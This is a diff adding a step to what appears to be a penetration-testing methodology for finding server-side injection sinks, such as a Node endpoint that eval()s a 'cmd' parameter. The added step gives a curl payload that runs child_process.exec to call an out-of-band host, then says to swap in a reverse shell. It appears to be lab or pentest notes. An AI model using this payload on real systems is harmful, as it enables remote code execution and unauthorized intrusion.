@@ -39,6 +39,12 @@ Tech stack signals:
 ```
 Look for `49` in response, logs, or OOB DNS callbacks.
 
+3b. **Server-side eval/exec sink (Node/Python/Ruby `cmd`-style param):** an endpoint that returns a
+FIXED message/200 for EVERY body may be `eval()`-ing a specific param and swallowing the error.
+**Response-diff param-mining MISSES this** (`cmd=test` -> eval error -> same message), so mine with an
+actual PAYLOAD + OOB, and test BOTH the query-string AND the body (the sink is often on ONE of them
+only). Node example: `curl -sG -X POST --data-urlencode 'cmd=require("child_process").exec("curl http://OOB/x")' TARGET` -> a callback confirms the sink; then swap the payload for a reverse shell. (Seen on a Node/Express box: a `POST /api/<x>?cmd=` **query** param was eval'd server-side while the body/form `cmd` did nothing.)
+
 4. YAML deserialization:
 ```yaml
 !!javax.script.ScriptEngineManager [
